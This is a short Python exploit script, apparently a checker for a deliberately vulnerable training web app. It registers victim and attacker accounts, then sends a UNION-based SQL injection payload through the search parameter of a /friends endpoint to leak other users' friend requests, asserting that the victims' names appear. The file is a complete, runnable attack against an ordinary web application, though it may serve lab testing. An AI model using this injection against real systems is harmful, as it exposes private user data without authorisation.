from requests import session, get
from sys import argv
from random import randint

SERVER = argv[1]

victimSession_A = session()
victimUsername_A = str(randint(2 ** 27, 2 ** 28))
victimPassword_A = str(randint(2 ** 27, 2 ** 28))
victimSession_B = session()
victimUsername_B = str(randint(2 ** 27, 2 ** 28))
victimPassword_B = str(randint(2 ** 27, 2 ** 28))
attackerSession = session()
attackerUsername = str(randint(2 ** 27, 2 ** 28))
attackerPassword = str(randint(2 ** 27, 2 ** 28))

# Cleaning DB
r = get(SERVER + "/init")
assert "Initialisation DONE!" in r.text

data = {
    "username": victimUsername_A,
    "password": victimPassword_A
}
r = victimSession_A.post(SERVER + "/register", data=data)

assert "Welcome" in r.text
assert victimUsername_A in r.text

data = {
    "username": victimUsername_B,
    "password": victimPassword_B
}
r = victimSession_B.post(SERVER + "/register", data=data)

assert "Welcome" in r.text
assert victimUsername_B in r.text

data = {
    "username": victimUsername_A
}
r = victimSession_B.post(SERVER + "/request_friend", data=data)

assert "Succesfully" in r.text
assert victimUsername_A in r.text

data = {
    "username": attackerUsername,
    "password": attackerPassword
}
r = attackerSession.post(SERVER + "/register", data=data)

assert "Welcome" in r.text
assert attackerUsername in r.text

params = {
    "search": "' AND 1 <> 1 UNION SELECT USERNAME1, 1, USERNAME2, ID, 1 FROM FriendsRequests -- "
}
r = attackerSession.get(SERVER + "/friends", params=params)

assert victimUsername_A in r.text
assert victimUsername_B in r.text

print("Success!")
victimSession_A.close()
victimSession_B.close()
attackerSession.close()
